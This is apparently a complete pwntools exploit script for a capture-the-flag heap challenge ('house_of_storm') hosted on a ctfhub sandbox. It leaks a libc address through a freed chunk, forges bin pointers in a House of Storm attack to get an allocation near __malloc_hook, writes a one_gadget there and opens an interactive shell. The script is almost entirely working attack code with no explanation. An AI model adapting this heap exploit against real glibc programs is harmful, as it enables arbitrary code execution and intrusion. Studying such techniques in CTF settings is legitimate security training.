from pwn import *
from LibcSearcher import *

context(log_level='debug',arch='amd64', os='linux')
pwnfile = "./house_of_storm_patched"
io = remote("challenge-0db2d5cba2de02f4.sandbox.ctfhub.com",23923)
#io = process(pwnfile)
elf = ELF(pwnfile)
libc = ELF("./libc-2.23.so")

s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda delims		    :io.recvuntil(delims)
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))


def add(idx,size):
	ru(b"choice: \n")
	sl(b"1")
	ru(b"idx:")
	sl(str(idx))
	ru(b"size:")
	sl(str(size))

def free(idx):
	ru(b"choice: \n")
	sl(b"2")
	ru(b"idx:")
	sl(str(idx))


def edit(idx,data):
	ru(b"choice: \n")
	sl(b"3")
	ru(b"idx:")
	sl(str(idx))
	ru(b"content:")
	s(data)


def show(idx):
	ru(b"choice: \n")
	sl(b"4")
	ru(b"idx:")
	sl(str(idx))


def back(data):
	ru(b"choice: \n")
	sl(b"5")
	s(data)


add(0,0x440)
add(1,0x450)
add(2,0x430)
add(3,0x450)
free(2)
free(0)

add(4,0x440)
free(4)
show(4)

ru(b"\n")
main_arena = uu64(r(6))
libc_base = main_arena-88-0x10-libc.sym['__malloc_hook']
malloc_hook = libc_base+libc.sym['__malloc_hook']
realloc_hook = libc_base+libc.sym["realloc"]
fake_chunk = malloc_hook-0x20
gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget = gadget[3]+libc_base
print("main_arena------------>: ",hex(main_arena))
print("libc_base-------------->: ",hex(libc_base))
print("realloc_hook------------>: ",hex(realloc_hook))
print("fake_chunk------------->: ",hex(fake_chunk))

edit(0,p64(0)+p64(fake_chunk))
edit(2,p64(0)+p64(fake_chunk+8)+p64(0)+p64(fake_chunk-0x18-5))

back(p64(0)*1+p64(one_gadget)+p64(realloc_hook+8))
add(5,0x430)

itr()
